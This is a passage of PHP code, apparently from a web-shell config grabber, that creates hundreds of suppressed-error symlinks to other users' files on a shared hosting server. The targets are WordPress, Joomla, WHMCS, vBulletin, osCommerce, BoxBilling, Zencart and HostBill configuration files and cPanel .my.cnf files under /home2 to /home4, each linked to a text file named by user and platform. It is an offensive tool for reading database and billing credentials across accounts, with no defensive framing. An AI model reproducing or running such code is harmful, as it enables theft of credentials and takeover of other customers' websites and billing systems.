@symlink('/home2/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home2/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
//Home3

@symlink('/home3/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home3/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home3/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home3/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
//Home4

@symlink('/home4/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home4/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home4/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
